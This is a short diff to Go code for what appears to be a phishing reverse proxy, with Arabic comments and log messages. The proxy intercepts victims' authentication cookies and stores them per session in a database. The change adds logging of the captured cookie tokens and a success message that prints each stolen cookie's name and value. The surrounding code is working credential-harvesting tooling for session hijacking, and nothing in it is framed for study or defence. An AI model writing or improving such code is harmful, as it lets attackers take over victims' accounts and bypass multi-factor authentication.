@@ -987,11 +987,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// فقط اعتراض الكوكيز ذات القيمة
 						if ck.Value != "" {
 							log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
+							
+							// طباعة محتوى CookieTokens قبل الإضافة
+							log.Debug("CookieTokens قبل الإضافة: %d domains", len(s.CookieTokens))
+							
 							s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							
+							// طباعة محتوى CookieTokens بعد الإضافة
+							log.Debug("CookieTokens بعد الإضافة: %d domains", len(s.CookieTokens))
+							
 							// حفظ الكوكيز في قاعدة البيانات فورًا
+							log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
 							if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 								log.Error("database: %v", err)
+							} else {
+								log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
 							}
 						}
 					}
